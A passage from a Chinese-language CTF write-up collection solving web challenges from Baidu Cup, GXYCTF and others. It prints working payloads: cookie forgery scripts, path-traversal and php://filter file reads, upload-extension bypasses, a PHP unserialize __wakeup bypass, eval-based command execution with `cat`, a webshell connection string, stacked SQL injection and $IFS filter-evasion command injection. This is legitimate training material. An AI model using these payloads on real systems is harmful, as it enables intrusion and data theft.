        $tmp .= chr(ord($txt[$i])+10);//txt变量的个个位数上的数字or字母的ascii码+10
    }
    $txt = $tmp;
    $rnd=random(4);//生成随机数
    $key=md5($rnd.$key);//加密key值
    $s=0;
    for($i=0;$i<strlen($txt);$i++){
        if($s == 32) $s = 0;
        $ttmp .= $txt[$i] ^ $key[++$s];
    }
    return base64_encode($rnd.$ttmp);
}
function decrypt($txt,$key){
    $txt=base64_decode($txt);
    $rnd = substr($txt,0,4);
    $txt = substr($txt,4);
    $key=md5($rnd.$key);

    $s=0;
    for($i=0;$i<strlen($txt);$i++){
        if($s == 32) 
            $s = 0;
        $tmp .= $txt[$i]^$key[++$s];	//$a ^ $b 	Xor（按位异或） 	将把 $a 和 $b 中一个为 1 另一个为 0 的位设为 1。
    }
    for($i=0;$i<strlen($tmp);$i++){
        $tmp1 .= chr(ord($tmp[$i])-10);
    }
    return $tmp1;
}
$username = decrypt($_COOKIE['user'],$key);
if ($username == 'system'){	//username='system'时输出flag
    echo $flag;
}else{
    setcookie('user',encrypt('guest',$key));
    echo "â®(â¯â½â°)â­";
}
?>
~~~

现在我们需要获取key值，可以利用eles代码段里执行得到结果获得key。访问fl3g_ichuqiu.php文件，获得 `encrypt('guest',$key)`得到的`setcookie`值

![image-20210511163942294](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210511163942294.png)





编写脚本文件，返回`system`的编码值

~~~php
<?php
    $txt1 = 'guest';
    for ($i = 0; $i < strlen($txt1); $i++) {
        $txt1[$i] = chr(ord($txt1[$i])+10);
    }
    $cookie_guest = 'dUptNkYaWh5M'; //自己浏览器guest返回的set-cookie值
    $cookie_guest = base64_decode($cookie_guest);
    $rnd = substr($cookie_guest,0,4); 
    $ttmp = substr($cookie_guest,4);
    $key='';
    for ($i = 0; $i < strlen($txt1); $i++) {
        $key .= ($txt1[$i] ^ $ttmp[$i]);//$key=md5($rnd.$key);
    }

    $txt2 = 'system';
    for ($i = 0; $i < strlen($txt2); $i++) {
        $txt2[$i] = chr(ord($txt2[$i])+10);
    }

    $md5 = '0123456789abcdef';
    for ($i = 0; $i < strlen($md5); $i++) {
        $key_new = $key.$md5[$i];
        $cookie_system='';
        for ($j = 0; $j < strlen($txt2); $j++) {
            $cookie_system .= ($key_new[$j] ^ $txt2[$j]);
        }
        $cookie_system = base64_encode($rnd.$cookie_system);
        echo $cookie_system."</br>";
    }  
?>
~~~

得到许多的base64编码值，用burp爆破出正确的cookie：user=？值，得到flag值

### “百度杯”CTF比赛 2017 二月场——Zone

![image-20210505130934079](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210505130934079.png)

进入页面是一个登录页面，抓包登录试试，看到cookie里有一个login=0，改成1试试，结果和正常一样。

![image-20210511203125993](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210511203125993.png)

扫一下目录结构，发现了许多文件，其中就包括flag.php

![image-20210511203226956](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210511203226956.png)

进入flag.php页面只显示了flag_is_here，估计flag值是在源码中，现在就是想办法获取flag.php文件的源码。

试试从index.php页面抓包修改login=1,成功进入管理员页面

![image-20210511203510988](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210511203510988.png)

点击Manage，发现url地址存在参数，怀疑是文件包含

![image-20210511203627136](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210511203627136.png)

修改index为flag，果然可以看到flag.php的文件显示，但是还是看不到源码。去访问/etc/passwd文件。并没有任何显示，是不是过滤了 `../`符号，用 `..././`绕过试试，成功回显信息。

![image-20210511204222007](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210511204222007.png)

**注意：这里我踩了一个坑，name参数后面的php后缀名要删除掉，不然不会回显任何信息**

接下来自己看的别人的WP，没有思路了……

我们在最后一行看到了nginx。我们去看一下nginx的配置文件。nginx的配置文件位置可能不太一样，不过在/etc/nginx/nginx.conf的可能性比较大。我们尝试访问一下，成功了：

![image-20210511204521857](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210511204521857.png)



![image-20210511204608599](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210511204608599.png)

注意最后一行包含的sites-enabled/default.进入之后发现了目录遍历的漏洞：

![image-20210511204822110](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210511204822110.png)



~~~
location /online-movies {
            alias /movie/;
            autoindex on;
        }
~~~

这里边的 autoindex on ，即为允许目录浏览。因此我们可以进行目录遍历了。 怎么遍历呢？我们直接访问/online-movies. ./，因为alias /movie/，因为会变成 /movie/. ./，我们访问试试：

![image-20210511205218905](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210511205218905.png)

成功显示了flag值。通过本题学习了中间件的目录访问

### “百度杯”2017年春秋欢乐赛——象棋

![image-20210505134028040](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210505134028040.png)

查看源代码，发现了了一个特别的js文件

![image-20210511205747009](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210511205747009.png)



猜想是不是正确猜出js文件的名字，然后访问此文件，获得下一步的线索。文件名是一个正则表达式，写个py脚本，然后用python脚本写个请求爆破一下吧

~~~python
#js文件名脚本，哈哈简单粗暴，五个for循环
pre_str='abcmlyx'
hou_str='0123456789'
for i in pre_str:
    for j in pre_str:
        pre = i+j+'ctf'
        for a in hou_str:
            for b in hou_str:
                for c in hou_str:
                    print(pre+a+b+c)
                    with open(r'ctf_str.txt', 'a+', encoding='utf-8') as f:
                        f.write(pre+a+b+c + '\n')
                        f.close()
~~~

~~~python
# 请求脚本
def bp():
    url='http://353e7b03144049c18a362f7dd41d8832df76c8b4bcec4b49.changame.ichunqiu.com/js/'
    try:
        for i in open('ctf_str.txt'):
            i = i.replace('\n','')
            html = requests.get(url+i+'.js').status_code
            if(html==200):
                print(i)
            # sleep(0.5)
            print(url+i+'.js'+"         "+str(html))
    except :
        pass
~~~

静静等待结果吧







### 第一届“百度杯”信息安全攻防总决赛 线上选拔赛——Upload

![image-20210514163331855](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210514163331855.png)

查看注释发现了用post方法ichunqiu=你的发现?。。。。抓包看看有什么发现嘛

![image-20210514163514415](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210514163514415.png)

果然在response包中有发现，base64解码看看是什么值，然后用post方法传递一下

![image-20210514163627700](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210514163627700.png)![image-20210514163652540](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210514163652540.png)

![image-20210514163725829](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210514163725829.png)

用post方法传递参数出来个fast！什么意思？？？

看看别人的WP吧。看到返回的是fast!!!，看来我的手速是满足不了ichunqiu了，那就上py跑

python脚本：

~~~python
def main():
    a = requests.session()
    b = a.get("http://6ebbbd692cc047ce8ccd326a88f72eb32090a688e6cc4bfa.changame.ichunqiu.com/")
    key1 = b.headers["flag"]
    c = base64.b64decode(key1)
    d = str(c).split(":")
    key = base64.b64decode(d[1])
    body = {"ichunqiu": key}
    f = a.post("http://6ebbbd692cc047ce8ccd326a88f72eb32090a688e6cc4bfa.changame.ichunqiu.com/", data=body)
    print(f.text)
~~~

得到了一个路径名：

![image-20210514165337201](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210514165337201.png)



进入了一个新页面

![image-20210514165419360](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210514165419360.png)

点击按钮，进入了一个登陆页面

![image-20210514165538338](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210514165538338.png)

爆破Captcha的python脚本

~~~python
def getFlag():
    key = 'cbadd1'
    # dict='abcdefghijklmnopqrstuvwxyz0123456789'
    for i in range(100000000000):
        a = hashlib.md5(str(i).encode()).hexdigest()[:6]
        if(a==key):
            print(i)
    pass

~~~

用SQL注入登录报错,抓包也没有发现特别的东西，那现在用户名和密码在那里获得呢？？？

![image-20210514165913008](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210514165913008.png)

看了别人的wp,发现上面那个目录存在.svn泄露，于是用dirsearch工具跑了一下，扫描出来了.svn/wc.db文件，打开看见了用户名。。。这题真的好细节。。。。。

![image-20210514171046029](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210514171046029.png)

算出username：8638d5263ab0d3face193725c23ce095，密码随便填一个就行，再输上验证码

![image-20210514171343917](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210514171343917.png)

又弹出了一个地址文件

![image-20210514171438298](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210514171438298.png)

上传文件漏洞，开始上传

试验如下上传参数，最终使用image/jpeg以及1.pht得到flag回显，应该是写死的逻辑。

```
------WebKitFormBoundarytJvTA9B9Lb4TVKYS
Content-Disposition: form-data; name="file"; filename="1.php"
Content-Type: text/php



------WebKitFormBoundarytJvTA9B9Lb4TVKYS
Content-Disposition: form-data; name="file"; filename="1.jpg"
Content-Type: image/jpeg



------WebKitFormBoundarytJvTA9B9Lb4TVKYS
Content-Disposition: form-data; name="file"; filename="1.php"
Content-Type: image/jpeg



------WebKitFormBoundarytJvTA9B9Lb4TVKYS
Content-Disposition: form-data; name="file"; filename="1.pht"
Content-Type: image/jpeg
```

- [Content-Type对照表](http://tool.oschina.net/commons)
- Apache解析php后缀：php、phtml、pht、php3、php4、php5

![image-20210514171906782](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210514171906782.png)

### “百度杯”CTF比赛 十月场——GetFlag

![image-20210514154717269](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210514154717269.png)

看注释抓数据包都没有发现，点击login是一个登录框，注释和数据包中都没有提示关于账号密码的有关信息，试试万能注入吧，并且还要爆破一下Captcha的值，写个py脚本吧

![image-20210514154818399](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210514154818399.png)

python脚本

~~~python
def getFlag():
    key = 'af1336'
    dict='abcdefghijklmnopqrstuvwxyz0123456789'
    for i in range(100000000000):
        a = hashlib.md5(str(i).encode()).hexdigest()[:6]
        if(a==key):
            print(i)
    pass
~~~

得到Captcha,并且成功登录

![image-20210514160018761](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210514160018761.png)

登录成功页面显示内容如下所示

![image-20210514160113043](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210514160113043.png)

a.php里的内容如下：

~~~php
<?php
	echo "Do what you want to do, web dog, flag is in the web root dir";
?>

~~~

查看注释，发现了下载链接！是不是存在任意目录下载漏洞？试试吧，a.php提示了flag在web根目录，即 ` /var/html/www/Challenges`

![image-20210514160316130](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210514160316130.png)

![image-20210514160719762](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210514160719762.png)



flag文件存在，但是返回的内容不对。

构造payload:

~~~
/Challenges/file/download.php?f=/var/www/html/Challenges/flag.php
~~~

得到如下代码，开始审计

~~~php
<?php
$f = $_POST['flag'];
$f = str_replace(array('`', '$', '*', '#', ':', '\\', '"', "'", '(', ')', '.', '>'), '', $f);
if((strlen($f) > 13) || (false !== stripos($f, 'return')))//$f长度小于13并且内容不包含‘return’
{
		die('wowwwwwwwwwwwwwwwwwwwwwwwww');
}
try
{
		 eval("\$spaceone = $f");
}
catch (Exception $e)
{
		return false;
}
if ($spaceone === 'flag'){
	echo file_get_contents("helloctf.php");
}

?>
 
~~~

通过代码审计得知给flag.php传入参数`?flag=flag;`即可获得helloctf.php的内容。 
 因为执行了一个eval()函数，要在代码末尾添加分号来结束一行代码，所以传入参数要带一个分号，进过eval()函数后分号被去掉。

![image-20210514162837104](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210514162837104.png)

或者——》百度了一样PHP字符串的表示方法，之后发现字符串还有一种表示方法叫做Heredoc，不包含引号，于是构造flag参数如图，因为包含换行，所以需要url编码

~~~
<<<s
flag
s;

~~~

### “百度杯”CTF比赛 十月场——Not Found

![image-20210506202653751](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210506202653751.png)

看源码没有任何发现，扫描目录没有任何发现，现在就只剩下抓包了。。。。

response数据包发现了异常，好像是在提示我们请求方法，下面把请求方法总结一下

![image-20210514203216275](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210514203216275.png)

> 1   GET  发送请求来获得服务器上的资源，请求体中不会包含请求数据，请求数据放在协议头中。另外get支持快取、缓存、可保留书签等。幂等
>
> 2   POST  和get一样很常见，向服务器提交资源让服务器处理，比如提交表单、上传文件等，可能导致建立新的资源或者对原有资源的修改。提交的资源放在请求体中。不支持快取。非幂等
>
> 3   HEAD  本质和get一样，但是响应中没有呈现数据，而是http的头信息，主要用来检查资源或超链接的有效性或是否可以可达、检查网页是否被串改或更新，获取头信息等，特别适用在有限的速度和带宽下。
>
>   4   PUT  和post类似，html表单不支持，发送资源与服务器，并存储在服务器指定位置，要求客户端事先知
>
> 道该位置；比如post是在一个集合上（/province），而put是具体某一个资源上（/province/123）。所以put是安全的，无论请求多少次，都是在123上更改，而post可能请求几次创建了几次资源。幂等
>
> 5   DELETE   请求服务器删除某资源。和put都具有破坏性，可能被防火墙拦截。如果是https协议，则无需担心。幂等   
>
> 6   CONNECT  HTTP/1.1协议中预留给能够将连接改为管道方式的代理服务器。就是把服务器作为跳板，去访问其他网页然后把数据返回回来，连接成功后，就可以正常的get、post了。
>
> 7   OPTIONS   获取http服务器支持的http请求方法，允许客户端查看服务器的性能，比如ajax跨域时的预检等。   
>
> 8   TRACE  回显服务器收到的请求，主要用于测试或诊断。一般禁用，防止被恶意攻击

在请求方法是options的时候发现了response数据包异常，提示了一个地址

![image-20210514203422492](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210514203422492.png)



用options方法请求`?f=1.php`,返回了一个302重定向包，返回数据包还有信息

![image-20210514203658866](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210514203658866.png)



~~~php
<?php 
	$msg = "not here";
	$msg .= PHP_EOL;
	$msg .="plz trying";
	echo $msg;
~~~

好的，又不知到下一步该怎么办了，看了别人的wp说目录里面有.htaceess文件，我看了自己的工具扫描的结果并没有发现啊，果然这工具真的不准确。。。。打开.htaccess看看里面有啥

![image-20210514210704307](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210514210704307.png)

提示了一个文件，访问试试啥情况。

![image-20210514210900929](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210514210900929.png)





ip不正确,XFF不对，修改一下`X-Forwarded-For`，好像修改XFF不行，修改 `clien-ip`就可以了，成功获得flag

![image-20210514211105269](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210514211105269.png)

刷了这么多ctf的web题，发现其实并不难，就是突然卡在某一步不知所措。。。。。自己还得多加练习啊

### “百度杯”CTF比赛 十月场——fuzzing

![image-20210506204654898](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210506204654898.png)

源码没有发现，抓包发现了异常

![image-20210514211438777](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210514211438777.png)



`ip,Large internal network`提示ip是大网段，用10.0.0.1试试

![image-20210514211617914](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210514211617914.png)



果然有蹊跷啊，重定向./m4nage.php

![image-20210514211752635](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210514211752635.png)

./m4nage.php文件输出一句话，show me your key ? 难道是传递一个key值？但是key值没有提示啊，用key=1试试吧

用GET方法没有反应，在请求包和cookie中加上key也没有反应，最后用post方法传递key值成功显示错误

![image-20210514212127514](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210514212127514.png)

看看错误信息

> key is not right,md5(key)==="1b4167610ba3f2ac426a68488dbd89be",and the key is ichunqiu***,the * is in [a-z0-9]

key值是ichunqiuxxx，现在就是写个py脚本爆破一下谁的md5值与给定的值相等

python爆破脚本：

~~~python
def fuzz():
    dict='abcdefghijklmnopqrstuvwxyz0123456789'
    key1='ichunqiu'
    for i in dict:
        for j in dict:
            for k in dict:
                result = hashlib.md5((key1+i+j+k).encode()).hexdigest()
                if(result == "1b4167610ba3f2ac426a68488dbd89be"):
                    print(key1+i+j+k)
~~~

爆破出来结果是：`ichunqiu105`

payload：

~~~
key=ichunqiu105
~~~

![image-20210514212512918](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210514212512918.png)

成功到达下一步，又给了一个php文件，访问请求一下

返回数据包

![image-20210514212607499](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210514212607499.png)



提示源代码在x0.txt文件中，又给了一段加密之后的密文。先看看x0.txt里面的源码吧

~~~php
function authcode($string, $operation = 'DECODE', $key = '', $expiry = 0) {
	$ckey_length = 4;

	$key = md5($key ? $key : UC_KEY);
	$keya = md5(substr($key, 0, 16));
	$keyb = md5(substr($key, 16, 16));
	$keyc = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length) : substr(md5(microtime()), -$ckey_length)) : '';

	$cryptkey = $keya . md5($keya . $keyc);
	$key_length = strlen($cryptkey);

	$string = $operation == 'DECODE' ? base64_decode(substr($string, $ckey_length)) : sprintf('%010d', $expiry ? $expiry + time() : 0) . substr(md5($string . $keyb), 0, 16) . $string;
	$string_length = strlen($string);

	$result = '';
	$box = range(0, 255);

	$rndkey = array();
	for ($i = 0; $i <= 255; $i++) {
		$rndkey[$i] = ord($cryptkey[$i % $key_length]);
	}

	for ($j = $i = 0; $i < 256; $i++) {
		$j = ($j + $box[$i] + $rndkey[$i]) % 256;
		$tmp = $box[$i];
		$box[$i] = $box[$j];
		$box[$j] = $tmp;
	}

	for ($a = $j = $i = 0; $i < $string_length; $i++) {
		$a = ($a + 1) % 256;
		$j = ($j + $box[$a]) % 256;
		$tmp = $box[$a];
		$box[$a] = $box[$j];
		$box[$j] = $tmp;
		$result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));
	}

	if ($operation == 'DECODE') {
		if ((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) && substr($result, 10, 16) == substr(md5(substr($result, 26) . $keyb), 0, 16)) {
			return substr($result, 26);
		} else {
			return '';
		}
	} else {
		return $keyc . str_replace('=', '', base64_encode($result));
	}

}
~~~

应该是运行这个PHP代码，传入`string`参数和 `key`密码，string是加密之后的密文，key就是我们之前破解的ichunqiu105。运行试试吧

![image-20210514213310938](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210514213310938.png)

成功获得flag值，欧耶

### “百度杯”CTF比赛 十月场——Hash（*）

![image-20210507084430919](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210507084430919.png)

点击hahaha超链接

![image-20210514213908130](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210514213908130.png)

看到这段话，我下意识想到的是数据包里面肯定有信息，我们要修改数据包中的信息，抓包看看吧

![image-20210514214118268](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210514214118268.png)



发现了123，修改成别的数据试试

![image-20210514214154958](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210514214154958.png)

提示hash值不对，看来key和hash值是绑定在一起的。看看他们两个有什么规律，怎么对应的

原来注释中有一段代码

~~~php
<!--$hash=md5($sign.$key);the length of $sign is 8
~~~

写个py脚本把`$sign`爆破出来吧

python脚本：

~~~python
def hash():
    hash = 'f9109d5f83921a551cf859f853afe7bb'
    key='123'
    for sign in range(10000000,99999999):
        h = hashlib.md5((str(sign)+key).encode()).hexdigest()
        if(h == hash):
            print(sign)
~~~

没有解出来，看来是前面的八位不只是只有数字，用网上的在线解密系统破解出来了

`sign=kkkkkk01`

好了，可以构造这一步的payload：

~~~
?key=111&hash=adaa10eef3a02754da03b5a3a6f40ae6
~~~

成功显示下一步：去访问Gu3ss_m3_h2h2.php

![image-20210514215259103](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210514215259103.png)

获得了一段PHP代码，开始代码审计吧

~~~php
<?php
class Demo {
    private $file = 'Gu3ss_m3_h2h2.php';

    public function __construct($file) {
        $this->file = $file;
    }

    function __destruct() {
        echo @highlight_file($this->file, true);
    }

    function __wakeup() {
        if ($this->file != 'Gu3ss_m3_h2h2.php') {
            //the secret is in the f15g_1s_here.php
            $this->file = 'Gu3ss_m3_h2h2.php';
        }
    }
}

if (isset($_GET['var'])) {
    $var = base64_decode($_GET['var']);//传递参数base64解码
    if (preg_match('/[oc]:\d+:/i', $var)) { //正则匹配，/i表示忽略大小写，防止大小写绕过
        die('stop hacking!');
    } else {

        @unserialize($var);
    }
} else {
    highlight_file("Gu3ss_m3_h2h2.php");
}
?> 
~~~

在上面的代码中看到了反序列化，看来这一关是写出序列化之后的字符串然后传递参数

序列化之后还要base64。

获得序列化代码

~~~php
<?php
class Demo {
    private $file = 'Gu3ss_m3_h2h2.php';

    public function __construct($file) {
        $this->file = $file;
    }

    function __destruct() {
        echo @highlight_file($this->file, true);
    }

    function __wakeup() {
        if ($this->file != 'Gu3ss_m3_h2h2.php') {
            //the secret is in the f15g_1s_here.php
            $this->file = 'Gu3ss_m3_h2h2.php';
        }
    }
}
$a = new Demo($file='f15g_1s_here.php');
echo serialize($a);

?> 
~~~



原始序列化字符串：O:4:"Demo":1:{s:10:"Demofile";s:16:"f15g_1s_here.php";} 

说下这个正则 /[oc]:\d+:/i [oc] 两个字母构成的原子表加：再加只是一个数字，再加： 然后不区分大小写

这个O 是序列化里面的类 C是自定义序列化方式

如果这个正则的绕过是O:+4 这样就可以绕过

改成：O:+4:"Demo":1:{s:10:"Demofile";s:16:"f15g_1s_here.php";} 

由于__wakeup（）方法会改变file变量值，所以只需要把Demo后面的的1改成大于1的数就行，代表着参数数量，就会绕过 \_\_wakeup()方法

改成：O:+4:"Demo":2:{s:10:"Demofile";s:16:"f15g_1s_here.php";} 

**！！！一定要注意！！！**

    private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，类名和字段名前面都会加上\0的前缀。字符串长度也包括所加前缀的长度。其中 \0 字符也是计算长度的。

对于private变量，我们需要在类名和字段名前面都会加上\0或%00的前缀
比如

~~~
O:4:"Name":3:{s:14:"\0Name\0username";s:5:"admin";s:14:"\0Name\0password";i:100;}
~~~

**本题我用在线php代码运行序列化有特殊符号，估计就是\0的乱码，但是就是复制不出来：**

![image-20210515131912146](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210515131912146.png)

注意%00Demo%00file，如果我们直接复制粘贴然后更改，就会出错。最好用PHP代码来改：

```php
<?php
class Demo {
    private $file = 'f15g_1s_here.php';


}
$a = new Demo();
$s = serialize($a);

$s = str_replace('O:4', 'O:+4',$s);//绕过正则

$s = str_replace(':1:', ':2:' ,$s);//绕过wakeup函数

echo base64_encode($s);//最后base64编码


?>
```

这样打印出的就是正确的base64编码了。这里Get到了一个新姿势。
所以payload:

~~~
?var=TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czoxNjoiZjE1Z18xc19oZXJlLnBocCI7fQ==
~~~

然后就可以获得f15g_1s_here.php的源码:：

~~~php
<?php
if (isset($_GET['val'])) {
    $val = $_GET['val'];
    eval('$value="' . addslashes($val) . '";');
} else {
    die('hahaha!');
}

?> 
~~~

主要就是eval的命令执行。
我们这样构造：

    ?val=${eval($_GET[a])}&a=echo `ls`;

利用的原理就是像这样实现命令执行：

    ${phpinfo()} 

这样成功执行了ls命令，发现了flag所在的文件，然后cat就可以获得flag:

~~~
?val=${eval($_GET[a])}&a=echo `cat True_F1ag_i3_Here_233.php`;
~~~

当然，也可以用蚁剑连：

~~~
/f15g_1s_here.php?val=${eval($_POST[a])}
~~~

### [极客大挑战 2019]Havefun 1

![image-20210507103243907](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210507103243907.png)

​							 			

![image-20210507103345039](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210507103345039.png)

​							 					

### [SUCTF 2019]EasySQL 1

![image-20210507105339870](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210507105339870.png)

说明这是个数字型注入，而且还屏蔽了order by、union select关键字，用堆叠注入发现了异常，爆出了数据库信息

![image-20210515135427302](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210515135427302.png)

爆出表信息，但是使用 `desc Flag`查询表的结构信息被拦截了

![image-20210515135620792](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210515135620792.png)

![image-20210515135720807](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210515135720807.png)

这该怎么办？？？没思路了，看看别人的wp，说是比赛时题目泄露了源码

~~~sql
select $_GET['query'] || flag from Flag
~~~



然后有两种解
**解题思路**1：

payload：`*,1`

查询语句：select *,1||flag from Flag
**解题思路**2：

payload:   `1;set sql_mode=PIPES_AS_CONCAT;select 1`

解析：

    在oracle 缺省支持 通过 ‘ || ’ 来实现字符串拼接。
    但在mysql 缺省不支持。需要调整mysql 的sql_mode
    模式：pipes_as_concat 来实现oracle 的一些功能。
![image-20210515140701481](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210515140701481.png)



### [ACTF2020 新生赛]Include 1

![image-20210507112302338](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210507112302338.png)

在url地址上发现了异常，猜想一下是文件包含漏洞吗？

使用PHP伪协议读取flag.php源码

![image-20210515141841619](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210515141841619.png)

~~~php
php://filter/convert.base64-encode/resource=flag.php
~~~

成功获得源码，base64解码获得flag

![image-20210515142041791](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210515142041791.png)



### [极客大挑战 2019]Secret File 1

![image-20210507112433680](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210507112433680.png)

源码中发现了超链接，点进去看看有什么![image-20210515142435067](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210515142435067.png)

还是有一个超链接SECRET，点进去并没有发现什么异常

![image-20210515142519836](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210515142519836.png)

页面提示，查阅结束，查看源码也没有什么异常。抓包看看吧

![image-20210515142717264](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210515142717264.png)



抓包发现了异常，这是一个重定向的包，注释中给了一个正确的文件地址

访问看看，出现了PHP代码，开始审计吧，看来还是文件包含啊

~~~php
<html>
    <title>secret</title>
    <meta charset="UTF-8">
<?php
    highlight_file(__FILE__);
    error_reporting(0);
    $file=$_GET['file'];
    if(strstr($file,"../")||stristr($file, "tp")||stristr($file,"input")||stristr($file,"data")){
        echo "Oh no!";
        exit();
    }
    include($file); 
//flag放在了flag.php里
?>
</html>
~~~

payload：/secr3t.php?file=flag.php 获得不了flag值

![image-20210515143424579](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210515143424579.png)

直接文件包含不显示flag，看来只能获得源码信息了

payload：

~~~
/secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php  
~~~

![image-20210515143857310](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210515143857310.png)

base64解码即可

![image-20210515143926391](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210515143926391.png)



### [极客大挑战 2019]LoveSQL 1

简单，利用information_schema库

### [ACTF2020 新生赛]Exec 1

超级简单，RCE 

Payload: 

![image-20210507194417743](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210507194417743.png)

### [GXYCTF2019]Ping Ping Ping

![image-20210507194557084](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210507194557084.png)

很明显这一关考察的内容是RCE，看看他有什么过滤限制吧

![image-20210515144219514](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210515144219514.png) 

`ls`命令成功显示flag.php文件，估计限制了空格或者特定访问这个文件的命令

输入空格报错了

![image-20210515144402920](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210515144402920.png)

**空格过滤**

> 1. ${IFS}替换
> 2. $IFS$1替换
> 3. ${IFS替换
> 4. %20替换
> 5. <和<>重定向符替换
> 6. %09替换

用`$IFS$数字`代替

还过滤了flag字母

![image-20210515144803348](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210515144803348.png)

可以使用变量拼接绕过

payload：

~~~
?ip=127.0.0.1;a=g;cat$IFS$2fla$a.php
~~~

成功获得flag值

![image-20210515145339369](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210515145339369.png)

还可以使用内联绕过。内联，就是将反引号内命令的输出作为输入执行。

```bash
?ip=127.0.0.1;cat$IFS$1`ls`
```

### [极客大挑战 2019]Knife

简单，略过

### [护网杯 2018]easy_tornado

![image-20210508093548461](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210508093548461.png)

线索

![image-20210508093716495](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210508093716495.png)

flag位置

![image-20210508093740677](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210508093740677.png)

> 思路：先用线索构造flag所在位置的md5值
>
> ​	 fllllllllllllag：md5值 594cb6af684ad354b4a59ac496473990
>
> ​	cookie_secret+md5(filename)：md5值 
>
> ​	cookie_secret没找到，百度一下吧，唉，原来是模板注入，提示在/welcome.txt里面，render
>
> ​	36277246-f3aa-4cea-a784-115ecefa55a2+594cb6af684ad354b4a59ac496473990.后来发现原来filename=/ fllllllllllllag，得加上/         严谨啊
>
> md5(36277246-f3aa-4cea-a784-115ecefa55a2+3bf9f6cf685a6dd8defadabfb41a03a1)最终得出flag

### [RoarCTF 2019]Easy Calc

源代码内容：

~~~js
<!--I've set up WAF to ensure security.-->
<script>
    $('#calc').submit(function(){
        $.ajax({
            url:"calc.php?num="+encodeURIComponent($("#content").val()),
